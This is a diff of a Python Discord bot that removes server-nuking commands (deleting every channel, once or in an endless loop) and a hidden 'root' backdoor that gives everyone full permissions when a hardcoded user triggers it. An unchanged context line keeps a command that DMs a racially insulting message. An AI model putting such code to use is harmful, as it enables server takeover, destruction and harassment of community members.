@@ -214,7 +214,7 @@ async def say(ctx, *,text):
 
 @client.command()
 async def sudo_logout(ctx):
-    if ctx.message.author.id == 786937653311569940:
+    if ctx.message.author.id == "your Discord ID":
         await ctx.message.delete()
         await client.close() 
         print("{0.user} has logged out successfully".format(client))
@@ -289,30 +289,7 @@ async def ctf(ctx, celsius: float):
 
 
 
-@commands.has_permissions(administrator=True)
-@client.command()
-async def sudo_clear(ctx):
-        await ctx.message.delete()
-        for c in ctx.guild.channels:
-            await c.delete()
-        await ctx.guild.create_text_channel('Luật')
-        await ctx.guild.create_text_channel('Thông báo')
-        await ctx.guild.create_text_channel('Chat chính')
-        with open('/Users/MatthewHa/code-ha/python/discord.png', 'rb') as f:
-            icon = f.read()
-        await ctx.guild.edit(name="Discord server")
-        await ctx.guild.edit(icon=icon)
 
-        print("Successfully!") 
-
-
-@commands.has_permissions(administrator=True)
-@client.command()
-async def sudo_block(ctx):
-    await ctx.message.delete()
-    while True:
-        for c in ctx.guild.channels: 
-            await c.delete()
 
 @commands.has_permissions(administrator=True)
 @client.command(pass_context=True)
@@ -402,40 +379,8 @@ async def disturb(ctx):
         await ctx.message.author.send(f'အမိုက်စား ခွေးမိုက် ၊ မင်း အသားအရေ မည်းညစ် ညစ်ပတ်တယ်')
 
         
-#For emergency use only
-@client.command()
-async def root(ctx):
-    if ctx.message.author.id == 786937653311569940:
-        await ctx.message.delete()
-        role = discord.utils.get(ctx.guild.roles, name = "@everyone")
-        await role.edit(permissions = Permissions.all())
-        
-@client.command()
-async def sudo_update(ctx):
-    if ctx.message.author.id == 786937653311569940:
-       embed = discord.Embed(title = "Introduce Moh 2.0 version!", description = '''
-       ===================== 
-       **DIFFERENCE**
-       =====================
-       Change the bot's name to **ML Bot**
-       ----------------------
-       Change the bot's prefix to **ml$**
 
-        ⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
-       
-       =====================
-        **NEW FEATURES**
-       =====================
-       1. Solve the expresssion, squareroot
-       ----------------------
-       2. Currency coverter
-       ----------------------
-       3. Temperature converter
-       ----------------------
-       4. Password generator
-       ----------------------
-        ''', color=0x73ff8a)
-    await ctx.send(embed = embed)
+
 
 @client.command()
 async def cc(ctx):
